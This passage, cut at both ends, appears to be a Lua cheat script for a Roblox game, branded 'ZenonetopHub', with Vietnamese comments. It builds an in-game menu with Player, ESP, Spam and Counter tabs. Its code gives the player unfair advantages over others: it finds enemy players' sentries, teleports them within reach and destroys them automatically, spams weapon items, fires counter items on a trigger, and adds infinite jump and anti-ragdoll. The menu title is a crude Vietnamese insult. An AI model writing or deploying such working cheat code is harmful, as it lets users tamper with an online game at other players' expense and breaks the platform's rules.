 Lighting.FogEnd = 1e10
 Lighting.Brightness = 0
 for _, e in pairs(Lighting:GetChildren()) do
 if e:IsA("BlurEffect") or e:IsA("BloomEffect") or e:IsA("SunRaysEffect")
 or e:IsA("ColorCorrectionEffect") or e:IsA("DepthOfFieldEffect") then
 pcall(function() e.Enabled = false end)
 end
 end
 for _, obj in ipairs(workspace:GetDescendants()) do applyDerender(obj) end
 if antiLagConn then antiLagConn:Disconnect() end
 antiLagConn = workspace.DescendantAdded:Connect(applyDerender)
	else
 if antiLagConn then antiLagConn:Disconnect() antiLagConn = nil end
 Lighting.GlobalShadows = true
 Lighting.FogEnd = 100000
 Lighting.Brightness = 2
	end
	saveCfg()
end


----------------------------------------------------------------
-- INFINITE JUMP (Vis BloodHounds hold)
----------------------------------------------------------------
local InfJump = { enabled = false, conn = nil, last = 0 }
-- (InfJump moved above with BloodHounds speed)

-- AUTO DESTROY SENTRY (full from AutoDestroyTurret)
----------------------------------------------------------------
local GTurret = { AutoDestroyTurret = false }
local turretBusy = setmetatable({}, { __mode = "k" })
local turretQueued = setmetatable({}, { __mode = "k" })
local turretCD = setmetatable({}, { __mode = "k" })
local activeTurretAtk = 0
function isEnemyTurret(obj)
	if not obj or not obj:IsA("BasePart") then return false end
	local name, nameLower = obj.Name, obj.Name:lower()
	local ownerId = name:match("^Sentry_(%d+)$") or name:match("^sentry_(%d+)$")
	if not ownerId then
 ownerId = name:match("^CandySentry_(%d+)$") or name:match("^Candy_Sentry_(%d+)$")
 or name:match("^candy_sentry_(%d+)$") or nameLower:match("^candy[_%-]?sentry_(%d+)$")
	end
	if not ownerId and nameLower:find("candy") and nameLower:find("sentry") then
 ownerId = name:match("(%d+)$")
	end
	if not ownerId then ownerId = name:match("^[Tt]urret_(%d+)$") end
	if not ownerId and nameLower:find("sentry") then ownerId = name:match("(%d+)$") end
	return ownerId ~= nil and tostring(ownerId) ~= tostring(LP.UserId)
end
function setTurretNoClip(turret)
	if not isEnemyTurret(turret) then return end
	pcall(function()
 turret.CanCollide = false
 turret.Anchored = true
 turret.AssemblyLinearVelocity = Vector3.zero
 turret.AssemblyAngularVelocity = Vector3.zero
	end)
end
function getTurretTimeLabel(turret)
	if not turret or not turret.Parent then return nil end
	local sf = turret:FindFirstChild("SetupFrame")
	local mf = sf and sf:FindFirstChild("MainFrame")
	local tl = mf and mf:FindFirstChild("Time")
	if tl and tl:IsA("TextLabel") then return tl end
	for _, d in ipairs(turret:GetDescendants()) do
 if d:IsA("TextLabel") then
 local n = d.Name:lower()
 if n == "time" or n == "timer" or n == "countdown" then return d end
 end
	end
	return nil
end
function shouldAttackTurret(turret)
	if LP:GetAttribute("Stealing") ~= nil then return false end
	if not isEnemyTurret(turret) then return false end
	setTurretNoClip(turret)
	local timeLabel = getTurretTimeLabel(turret)
	if timeLabel then
 local ok, text = pcall(function() return timeLabel.Text end)
 if not ok then return false end
 text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
 if text == "" then return false end
 if string.find(text, "^%d+%s*[sS]!?$") or string.find(text, "^%d+$") then return true end
 return false
	end
	return true
end
function bringTurretInFront(turret, hrp)
	if not turret or not hrp then return end
	local forward = hrp.CFrame.LookVector
	local targetPos = hrp.Position + forward * 2.8 + Vector3.new(0, 1.15, 0)
	pcall(function()
 turret.AssemblyLinearVelocity = Vector3.zero
 turret.CFrame = CFrame.lookAt(targetPos, targetPos + forward)
	end)
end
function findBat()
	local char = LP.Character
	if not char then return nil end
	local bat = char:FindFirstChild("Bat") or LP.Backpack:FindFirstChild("Bat")
	if bat then return bat end
	for _, t in ipairs(char:GetChildren()) do
 if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
	end
	for _, t in ipairs(LP.Backpack:GetChildren()) do
 if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
	end
	return nil
end
function ensureBat(hum, char)
	local held = char:FindFirstChildOfClass("Tool")
	if held and (held.Name == "Bat" or held.Name:lower():find("bat")) then return held end
	local bat = findBat()
	if not bat then return nil end
	pcall(function() hum:EquipTool(bat) end)
	return char:FindFirstChild("Bat") or bat
end
function attackTurret(turret)
	local now = os.clock()
	if turretBusy[turret] or turretQueued[turret] then return end
	if activeTurretAtk >= 2 then return end
	if not shouldAttackTurret(turret) then return end
	if (turretCD[turret] or 0) > now then return end
	turretQueued[turret] = true
	turretCD[turret] = now + 0.15
	task.spawn(function()
 turretQueued[turret] = nil
 if activeTurretAtk >= 2 or turretBusy[turret] or not shouldAttackTurret(turret) then return end
 activeTurretAtk = activeTurretAtk + 1
 turretBusy[turret] = true
 pcall(function()
 local attempts, batReady = 0, false
 while attempts < 18 and GTurret.AutoDestroyTurret do
 if not turret or not turret.Parent or not shouldAttackTurret(turret) then break end
 local char = LP.Character
 local hrp = char and char:FindFirstChild("HumanoidRootPart")
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 if not hrp or not hum or hum.Health <= 0 then break end
 local okD, dist = pcall(function() return (turret.Position - hrp.Position).Magnitude end)
 if okD and dist > 250 then break end
 setTurretNoClip(turret)
 bringTurretInFront(turret, hrp)
 local bat
 if not batReady then
 bat = ensureBat(hum, char)
 batReady = bat ~= nil
 else
 bat = char:FindFirstChild("Bat") or findBat()
 local held = char:FindFirstChildOfClass("Tool")
 if held and held.Name ~= "Bat" and not held.Name:lower():find("bat") then break end
 end
 if bat then pcall(function() bat:Activate() end) end
 attempts = attempts + 1
 task.wait(0.045)
 end
 end)
 turretBusy[turret] = nil
 activeTurretAtk = math.max(0, activeTurretAtk - 1)
	end)
end
workspace.DescendantAdded:Connect(function(obj)
	if isEnemyTurret(obj) then setTurretNoClip(obj) end
	if GTurret.AutoDestroyTurret and shouldAttackTurret(obj) then task.defer(attackTurret, obj) end
end)
task.spawn(function()
	while task.wait(0.25) do
 if GTurret.AutoDestroyTurret then
 local pending = {}
 for _, obj in ipairs(workspace:GetDescendants()) do
 if isEnemyTurret(obj) then
 setTurretNoClip(obj)
 if shouldAttackTurret(obj) and not turretBusy[obj] then
 table.insert(pending, obj)
 end
 end
 end
 local char = LP.Character
 local hrp = char and char:FindFirstChild("HumanoidRootPart")
 if hrp and #pending > 0 then
 table.sort(pending, function(a, b)
 return (a.Position - hrp.Position).Magnitude < (b.Position - hrp.Position).Magnitude
 end)
 for i = 1, math.min(2, #pending) do attackTurret(pending[i]) end
 end
 end
	end
end)
function setDestroySentry(on)
	St.destroySentry = on and true or false
	GTurret.AutoDestroyTurret = St.destroySentry
	if _G.ZenonetopRefreshSentryBtn then _G.ZenonetopRefreshSentryBtn() end
	saveCfg()
end

----------------------------------------------------------------
-- SPAM LASER CAPE / PAINTBALL (activate only, no auto-equip)
----------------------------------------------------------------
local spamConn = nil
function startSpamLoop()
	if spamConn then return end
	spamConn = RS.Heartbeat:Connect(function()
 local char = LP.Character
 if not char then return end
 local tool = char:FindFirstChildOfClass("Tool")
 if not tool then return end
 local n = tool.Name
 if St.spamLaser and n == "Laser Cape" then
 if aimOn then overrideMouse() end
 pcall(function() tool:Activate() end)
 elseif St.spamPaint and n == "Paintball Gun" then
 if aimOn then overrideMouse() end
 pcall(function() tool:Activate() end)
 end
	end)
end
function stopSpamLoopIfIdle()
	if not St.spamLaser and not St.spamPaint then
 if spamConn then pcall(function() spamConn:Disconnect() end) spamConn = nil end
	end
end
function setSpamLaser(on)
	St.spamLaser = on and true or false
	if St.spamLaser then startSpamLoop() else stopSpamLoopIfIdle() end
	saveCfg()
end
function setSpamPaint(on)
	St.spamPaint = on and true or false
	if St.spamPaint then startSpamLoop() else stopSpamLoopIfIdle() end
	saveCfg()
end

----------------------------------------------------------------
-- COUNTER: Laser Cape / Boogie Bomb / Swap Body / Equip on Drop
----------------------------------------------------------------
local counterConn = nil
local COUNTER_TOOL_NAMES = {
	laser = { "Laser Cape", "LaserCape", "laser cape" },
	boogie = { "Boogie Bomb", "BoogieBomb", "boogie bomb", "Disco Ball" },
	swap = { "Body Swap Potion", "Swap Body", "Body Swap", "SwapBody", "Potion of Body Swap" },
}

local function findToolByNames(names)
	local char = LP.Character
	local bp = LP:FindFirstChild("Backpack")
	for _, nm in ipairs(names) do
 if char then
 local t = char:FindFirstChild(nm)
 if t and t:IsA("Tool") then return t end
 end
 if bp then
 local t = bp:FindFirstChild(nm)
 if t and t:IsA("Tool") then return t end
 end
	end
	-- fuzzy
	local function scan(parent)
 if not parent then return nil end
 for _, ch in ipairs(parent:GetChildren()) do
 if ch:IsA("Tool") then
 local ln = string.lower(ch.Name)
 for _, nm in ipairs(names) do
 if ln:find(string.lower(nm), 1, true) then return ch end
 end
 end
 end
 return nil
	end
	return scan(char) or scan(bp)
end

local function equipAndActivate(tool)
	if not tool then return end
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	pcall(function()
 if tool.Parent ~= char then
 hum:EquipTool(tool)
 end
	end)
	task.defer(function()
 pcall(function() tool:Activate() end)
	end)
end

function startCounterLoop()
	-- No spam Activate khi chọn counter — chỉ dùng lúc Drop
	if counterConn then
 pcall(function() counterConn:Disconnect() end)
 counterConn = nil
	end
end

function stopCounterLoopIfIdle()
	if not (St.counterLaser or St.counterBoogie or St.counterSwapBody or St.equipOnDrop) then
 if counterConn then pcall(function() counterConn:Disconnect() end) counterConn = nil end
	end
end

local function _counterExclusive(which)
	-- Chỉ 1 counter ON: OFF các cái còn lại
	St.counterLaser = (which == "laser")
	St.counterBoogie = (which == "boogie")
	St.counterSwapBody = (which == "swap")
	if ToggleRefs then
 for k, flag in pairs({counterLaser = (which=="laser"), counterBoogie = (which=="boogie"), counterSwapBody = (which=="swap")}) do
 local r = ToggleRefs[k]
 if r and r.setVisual then pcall(r.setVisual, flag) end
 end
	end
end

function setCounterLaser(on)
	if on then
 _counterExclusive("laser")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterLaser = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setCounterBoogie(on)
	if on then
 _counterExclusive("boogie")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterBoogie = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setCounterSwapBody(on)
	if on then
 _counterExclusive("swap")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterSwapBody = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setEquipOnDrop(on)
	St.equipOnDrop = on and true or false
	saveCfg()
end

-- Equip + activate khi Drop xong
_G.ZenonetopCounterOnDrop = function()
	-- Counter đã chọn: equip 1 + activate 2 khi Drop (Fling & Jump)
	local anyCounter = St.counterLaser or St.counterBoogie or St.counterSwapBody
	if not anyCounter and not St.equipOnDrop then return end
	if _G._VisCounterDropBusy == true then return end
	_G._VisCounterDropBusy = true
	task.spawn(function()
 local char = LP.Character
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 local prevTool = char and char:FindFirstChildOfClass("Tool")
 local prevName = prevTool and prevTool.Name or nil
 task.wait(0.2)
 local function runOnce(names)
 local tool = findToolByNames(names)
 if not tool then return end
 equipAndActivate(tool) -- equip + activate #1
 task.wait(0.15)
 pcall(function() tool:Activate() end) -- activate #2
 task.wait(0.1)
 end
 if St.counterLaser then runOnce(COUNTER_TOOL_NAMES.laser) end
 if St.counterBoogie then runOnce(COUNTER_TOOL_NAMES.boogie) end
 if St.counterSwapBody then runOnce(COUNTER_TOOL_NAMES.swap) end
 task.wait(0.1)
 pcall(function()
 local c = LP.Character
 local h = c and c:FindFirstChildOfClass("Humanoid")
 if not h or not prevName then return end
 local pl = string.lower(prevName)
 local isCounter = false
 for _, names in pairs(COUNTER_TOOL_NAMES) do
 for _, nm in ipairs(names) do
 if pl:find(string.lower(nm), 1, true) then isCounter = true break end
 end
 if isCounter then break end
 end
 if not isCounter then
 local bp = LP:FindFirstChild("Backpack")
 local t = (c and c:FindFirstChild(prevName)) or (bp and bp:FindFirstChild(prevName))
 if t and t:IsA("Tool") then h:EquipTool(t) end
 end
 end)
 _G._VisCounterDropBusy = false
	end)
end

-- Bật toggle Counter: equip 1 + activate 2 (một lần)
_G.ZenonetopCounterOneShot = function(kind)
	if _G._VisCounterDropBusy then return end
	_G._VisCounterDropBusy = true
	task.spawn(function()
 local names = COUNTER_TOOL_NAMES[kind]
 if not names then _G._VisCounterDropBusy = false return end
 local tool = findToolByNames(names)
 if tool then
 equipAndActivate(tool)
 task.wait(0.15)
 pcall(function() tool:Activate() end)
 end
 _G._VisCounterDropBusy = false
	end)
end



function corner(p, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r or 10)
	c.Parent = p
	return c
end
function stroke(p, col)
	local s = Instance.new("UIStroke")
	s.Color = col or C.stroke
	s.Thickness = 1
	s.Transparency = 0.35
	s.Parent = p
	return s
end

local Gui = Instance.new("ScreenGui")
Gui.Name = "ZenonetopHubFullMenu"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.DisplayOrder = 200
Gui.Parent = PlayerGui

local MW, MH = 310, 380
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, MW, 0, MH)
Main.Position = UDim2.new(0.5, -MW / 2, 0.5, -MH / 2)
Main.BackgroundColor3 = C.bg
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Main.Parent = Gui

-- Menu scale (to/nhỏ menu chính)
local menuScaleObj = Instance.new("UIScale")
menuScaleObj.Name = "ZenonetopMenuScale"
menuScaleObj.Scale = tonumber(St.menuScale) or 1
menuScaleObj.Parent = Main
function applyMenuScale()
	local sc = math.clamp(tonumber(St.menuScale) or 1, 0.5, 1.5)
	St.menuScale = sc
	if menuScaleObj and menuScaleObj.Parent then
 menuScaleObj.Scale = sc
	else
 -- fallback: resize Main
 local baseW, baseH = 270, 360
 Main.Size = UDim2.new(0, math.floor(baseW * sc), 0, math.floor(baseH * sc))
	end
end
pcall(applyMenuScale)
-- restore menu position
pcall(function()
	local p = St._mainPos
	if type(p) == "table" and p[1] ~= nil then
 Main.Position = UDim2.new(p[1], p[2], p[3], p[4])
	end
end)

corner(Main, 14)
local mainStroke = stroke(Main)
mainStroke.Thickness = 2.2
mainStroke.Transparency = 0
-- Empire-style animated outline gradient
do
	local g = Instance.new("UIGradient")
	g.Name = "EmpireOutlineGrad"
	g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
 ColorSequenceKeypoint.new(0.15, Color3.fromRGB(255, 140, 200)),
 ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 45, 160)),
 ColorSequenceKeypoint.new(0.55, Color3.fromRGB(255, 20, 140)),
 ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 80, 180)),
 ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 150, 210)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
	})
	g.Parent = mainStroke
	task.spawn(function()
 local t0 = tick()
 while mainStroke and mainStroke.Parent do
 local t = (tick() - t0) * 0.35
 g.Rotation = (t * 60) % 360
 task.wait(0.03)
 end
	end)
end

local Top = Instance.new("Frame")
Top.Size = UDim2.new(1, 0, 0, 36)
Top.BackgroundColor3 = C.bg2
Top.BorderSizePixel = 0
Top.ZIndex = 15
Top.Active = true
Top.Parent = Main
corner(Top, 14)
local topFix = Instance.new("Frame")
topFix.Size = UDim2.new(1, 0, 0, 12)
topFix.Position = UDim2.new(0, 0, 1, -12)
topFix.BackgroundColor3 = C.bg2
topFix.BorderSizePixel = 0
topFix.Parent = Top

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -80, 1, 0)
Title.Position = UDim2.new(0, 14, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Free Sell La Tuat Ngu Lon"
Title.TextColor3 = Color3.fromRGB(255, 230, 245)
Title.TextSize = 12
Title.Font = Enum.Font.GothamBlack
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextStrokeTransparency = 0.55
Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 160)
Title.Parent = Top
-- gradient chữ menu
local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 160, 210)),
	ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255, 90, 180)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 140, 255)),
})
titleGrad.Parent = Title
task.spawn(function()
	local t0 = tick()
	while Title and Title.Parent do
 titleGrad.Offset = Vector2.new((math.sin(tick() - t0) * 0.35), 0)
 task.wait(0.03)
	end
end)

-- Close nút nhỏ góc phải (phụ)
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 22, 0, 22)
CloseBtn.Position = UDim2.new(1, -28, 0.5, -11)
CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 32, 48)
CloseBtn.Text = "−"
CloseBtn.TextColor3 = C.textDim
CloseBtn.TextSize = 11
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = Top
corner(CloseBtn, 6)

-- Helper tròn bên TRÁI menu (LKZ style) — ấn = đóng
local Helper = Instance.new("TextButton")
Helper.Name = "HelperClose"
Helper.Size = UDim2.new(0, 44, 0, 44)
Helper.Position = UDim2.new(0, -52, 0, 8)
Helper.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
Helper.Text = "⚔"
Helper.TextColor3 = C.accent
Helper.TextSize = 18
Helper.Font = Enum.Font.GothamBold
Helper.AutoButtonColor = false
Helper.Parent = Main
corner(Helper, 22)
local hs = Instance.new("UIStroke", Helper)
hs.Color = C.accent
hs.Thickness = 2
hs.Transparency = 0.15

-- Tabs dọc (Clean style) — PC kéo xuống được
local TAB_W = 72
local TabBar = Instance.new("ScrollingFrame")
TabBar.Name = "TabBar"
TabBar.Size = UDim2.new(0, TAB_W, 1, -48)
TabBar.Position = UDim2.new(0, 4, 0, 44)
TabBar.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
TabBar.BackgroundTransparency = 0.25
TabBar.BorderSizePixel = 0
TabBar.ScrollBarThickness = 4
TabBar.ScrollBarImageColor3 = C.accent
TabBar.ScrollingDirection = Enum.ScrollingDirection.Y
TabBar.CanvasSize = UDim2.new(0, 0, 0, 0)
TabBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
TabBar.ZIndex = 20
TabBar.Active = true
TabBar.Selectable = true
TabBar.Parent = Main
corner(TabBar, 8)
local tabList = Instance.new("UIListLayout", TabBar)
tabList.FillDirection = Enum.FillDirection.Vertical
tabList.Padding = UDim.new(0, 4)
tabList.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabList.SortOrder = Enum.SortOrder.LayoutOrder
local tabPad = Instance.new("UIPadding", TabBar)
tabPad.PaddingTop = UDim.new(0, 4)
tabPad.PaddingBottom = UDim.new(0, 6)
tabPad.PaddingLeft = UDim.new(0, 3)
tabPad.PaddingRight = UDim.new(0, 3)

local pages, tabBtns = {}, {}
function makePage(name)
	local sc = Instance.new("ScrollingFrame")
	sc.Name = name
	-- Nội dung bên phải tab dọc
	sc.Size = UDim2.new(1, -(TAB_W + 10), 1, -52)
	sc.Position = UDim2.new(0, TAB_W + 8, 0, 48)
	sc.BackgroundTransparency = 1
	sc.BorderSizePixel = 0
	sc.ScrollBarThickness = 4
	sc.ScrollBarImageColor3 = C.accent
	sc.ScrollingDirection = Enum.ScrollingDirection.Y
	sc.AutomaticCanvasSize = Enum.AutomaticSize.Y
	sc.CanvasSize = UDim2.new(0, 0, 0, 0)
	sc.Visible = false
	sc.ZIndex = 10
	sc.Active = true
	sc.Selectable = true
	sc.Parent = Main
	local pad = Instance.new("UIPadding", sc)
	pad.PaddingTop = UDim.new(0, 4)
	pad.PaddingBottom = UDim.new(0, 10)
	pad.PaddingLeft = UDim.new(0, 6)
	pad.PaddingRight = UDim.new(0, 8)
	local lay = Instance.new("UIListLayout", sc)
	lay.Padding = UDim.new(0, 5)
	lay.SortOrder = Enum.SortOrder.LayoutOrder
	sc.Active = true
	sc.Selectable = true
	pages[name] = sc
	return sc
end
local pagePlayer = makePage("Player")
local pageESP = makePage("ESP")
local pageSpam = makePage("Spam")
local pageCounter = makePage("Counter")
local pageSet = makePage("Settings")
local pageKeys = makePage("Keybinds")

function setTab(name)
	for n, p in pairs(pages) do
 p.Visible = (n == name)
 p.ZIndex = 3
	end
	for n, b in pairs(tabBtns) do
 local on = n == name
 b.BackgroundColor3 = on and C.accent or C.card
 b.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
	end
end
function addTab(name, order)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -4, 0, 28)
	b.BackgroundColor3 = C.card
	b.Text = name
	b.TextColor3 = C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.LayoutOrder = order
	b.Active = true
	b.Selectable = true
	b.ZIndex = 21
	b.Parent = TabBar
	corner(b, 8)
	local function go() setTab(name) end
	b.MouseButton1Click:Connect(go)
	b.Activated:Connect(go)
	tabBtns[name] = b
end
addTab("Player", 1)
addTab("ESP", 2)
addTab("Spam", 3)
addTab("Counter", 4)
addTab("Settings", 5)
addTab("Keybinds", 6)

function section(parent, text, order)
	local f = Instance.new("Frame")
	f.Size = UDim2.new(1, 0, 0, 16)
	f.BackgroundTransparency = 1
	f.LayoutOrder = order
	f.Parent = parent
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, 0, 1, 0)
	t.BackgroundTransparency = 1
	t.Text = text
	t.TextColor3 = C.textDim
	t.TextSize = 11
	t.Font = Enum.Font.GothamBold
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = f
end
function row(parent, h, order)
	local f = Instance.new("Frame")
	f.Size = UDim2.new(1, 0, 0, h or 38)
	f.BackgroundColor3 = C.card
	f.BorderSizePixel = 0
	f.LayoutOrder = order
	f.Active = true
	f.Parent = parent
	corner(f, 9)
	stroke(f)
	return f
end
function toggle(parent, label, default, cb, order)
	local r = row(parent, 38, order)
	local txt = Instance.new("TextLabel")
	txt.Size = UDim2.new(1, -60, 1, 0)
	txt.Position = UDim2.new(0, 12, 0, 0)
	txt.BackgroundTransparency = 1
	txt.Text = label
	txt.TextColor3 = C.text
	txt.TextSize = 13
	txt.Font = Enum.Font.Gotham
	txt.TextXAlignment = Enum.TextXAlignment.Left
	txt.Parent = r
	local track = Instance.new("Frame")
	track.Size = UDim2.new(0, 40, 0, 22)
	track.Position = UDim2.new(1, -50, 0.5, -11)
	track.BackgroundColor3 = default and C.on or C.off
	track.BorderSizePixel = 0
	track.Parent = r
	corner(track, 11)
	local knob = Instance.new("Frame")
	knob.Size = UDim2.new(0, 18, 0, 18)
	knob.Position = default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
	knob.BackgroundColor3 = Color3.new(1, 1, 1)
	knob.BorderSizePixel = 0
	knob.Parent = track
	corner(knob, 9)
	local state = default
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundTransparency = 1
	btn.Text = ""
	btn.Parent = r
	local function apply(on)
 state = on and true or false
 TS:Create(track, TweenInfo.new(0.15), { BackgroundColor3 = state and C.on or C.off }):Play()
 TS:Create(knob, TweenInfo.new(0.15), {
 Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 }):Play()
 if cb then pcall(cb, state) end
 pcall(saveCfg)
	end
	btn.Active = true
	btn.Selectable = true
	btn.ZIndex = 50
	track.ZIndex = 6
	knob.ZIndex = 7
	r.Active = true
	local _busy = false
	local function fireToggle()
 if _busy then return end
 _busy = true
 apply(not state)
 task.delay(0.15, function() _busy = false end)
	end
	btn.MouseButton1Click:Connect(fireToggle)
	btn.Activated:Connect(fireToggle)
	-- mobile fallback: InputEnded short tap
	do
 local down, startP
 btn.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 down = true
 startP = input.Position
 end
 end)
 btn.InputEnded:Connect(function(input)
 if not down then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 down = false
 if startP and (input.Position - startP).Magnitude < 12 then
 fireToggle()
 end
 end)
	end
	local function setVisualOnly(on)
 state = on and true or false
 TS:Create(track, TweenInfo.new(0.12), { BackgroundColor3 = state and C.on or C.off }):Play()
 TS:Create(knob, TweenInfo.new(0.12), {
 Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 }):Play()
	end
	return {
 set = apply,
 setVisual = setVisualOnly,
 get = function() return state end,
	}
end
function toggleNamed(parent, label, default, cb, order, refName)
	local api = toggle(parent, label, default, cb, order)
	if refName then ToggleRefs[refName] = api end
	return api
end
function numBox(parent, pos, w, val, cb)
	local b = Instance.new("TextBox")
	b.Size = UDim2.new(0, w, 0, 24)
	b.Position = pos
	b.BackgroundColor3 = C.box
	b.Text = tostring(val)
	b.TextColor3 = C.text
	b.TextSize = 12
	b.Font = Enum.Font.GothamBold
	b.ClearTextOnFocus = false
	b.Active = true
	b.ZIndex = 25
	b.Parent = parent
	corner(b, 6)
	b.FocusLost:Connect(function()
 local n = tonumber(b.Text)
 if n then
 n = math.clamp(n, 1, 200)
 b.Text = tostring(n)
 if cb then cb(n) end
 else
 b.Text = tostring(val)
 end
	end)
	return b
end
function keyName(k)
	return k and tostring(k):gsub("Enum.KeyCode.", "") or "?"
end
local listening = nil
function keyBtn(parent, key, onSet, pos)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 36, 0, 24)
	b.Position = pos or UDim2.new(0, 0, 0, 0)
	b.BackgroundColor3 = C.box
	b.Text = keyName(key)
	b.TextColor3 = C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 25
	b.Parent = parent
	corner(b, 6)
	b.MouseButton1Click:Connect(function()
 if listening then return end
 listening = b
 b.Text = "..."
 local conn
 conn = UIS.InputBegan:Connect(function(input, gp)
 if gp or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
 if input.KeyCode == Enum.KeyCode.Escape then
 b.Text = keyName(key)
 listening = nil
 conn:Disconnect()
 return
 end
 key = input.KeyCode
 b.Text = keyName(key)
 listening = nil
 conn:Disconnect()
 if onSet then onSet(key) end
 end)
	end)
	return b
end
function actionBtn(parent, text, color, cb, order)
	local r = row(parent, 36, order)
	r.BackgroundColor3 = color or C.accent
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, 0, 1, 0)
	b.BackgroundTransparency = 1
	b.Text = text
	b.TextColor3 = Color3.fromRGB(30, 20, 30)
	b.TextSize = 13
	b.Font = Enum.Font.GothamBold
	b.Parent = r
	b.Active = true
	b.ZIndex = 20
	local _busy = false
	local function fire()
 if _busy then return end
 _busy = true
 if cb then pcall(cb) end
 task.delay(0.15, function() _busy = false end)
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
	return r
end

----------------------------------------------------------------
-- PLAYER TAB
----------------------------------------------------------------
section(pagePlayer, "* — ANTI", 1)
toggleNamed(pagePlayer, "Anti Gummy Bear", St.antiGummy, setAntiGummy, 2, "antiGummy")
toggleNamed(pagePlayer, "Anti Ragdoll", St.antiRagdoll, setAntiRagdoll, 3, "antiRagdoll")
do
	local r = row(pagePlayer, 36, 3.5)
	local label = Instance.new("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(0.4, 0, 1, 0)
	label.Font = Enum.Font.Gotham
	label.TextSize = 12
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextColor3 = C.textDim
	label.Text = " Mode"
	label.Parent = r
	local holder = Instance.new("Frame")
	holder.Size = UDim2.new(0.55, 0, 0, 26)
	holder.Position = UDim2.new(0.42, 0, 0.5, -13)
	holder.BackgroundColor3 = C.box
	holder.BorderSizePixel = 0
	holder.Parent = r
	local hc = Instance.new("UICorner")
	hc.CornerRadius = UDim.new(0, 8)
	hc.Parent = holder
	local slide = Instance.new("Frame")
	slide.Size = UDim2.new(0.5, -6, 1, -6)
	slide.Position = UDim2.new(0, 3, 0, 3)
	slide.BackgroundColor3 = C.accent
	slide.BorderSizePixel = 0
	slide.ZIndex = 2
	slide.Parent = holder
	local sc = Instance.new("UICorner")
	sc.CornerRadius = UDim.new(0, 6)
	sc.Parent = slide
	local t1 = Instance.new("TextLabel")
	t1.BackgroundTransparency = 1
	t1.Size = UDim2.new(0.5, 0, 1, 0)
	t1.Font = Enum.Font.GothamBold
	t1.TextSize = 11
	t1.Text = "V1"
	t1.TextColor3 = C.text
	t1.ZIndex = 3
	t1.Parent = holder
	local t2 = Instance.new("TextLabel")
	t2.BackgroundTransparency = 1
	t2.Size = UDim2.new(0.5, 0, 1, 0)
	t2.Position = UDim2.new(0.5, 0, 0, 0)
	t2.Font = Enum.Font.GothamBold
	t2.TextSize = 11
	t2.Text = "V2"
	t2.TextColor3 = C.text
	t2.ZIndex = 3
	t2.Parent = holder
	local function refresh()
 local isV2 = tostring(St.antiRagdollMode or "V1"):upper() == "V2"
 slide.Position = isV2 and UDim2.new(0.5, 2, 0, 3) or UDim2.new(0, 3, 0, 3)
 t1.TextTransparency = isV2 and 0.35 or 0
 t2.TextTransparency = isV2 and 0 or 0.35
	end
	_G.ZenonetopRefreshAntiRagMode = refresh
	local b1 = Instance.new("TextButton")
	b1.BackgroundTransparency = 1
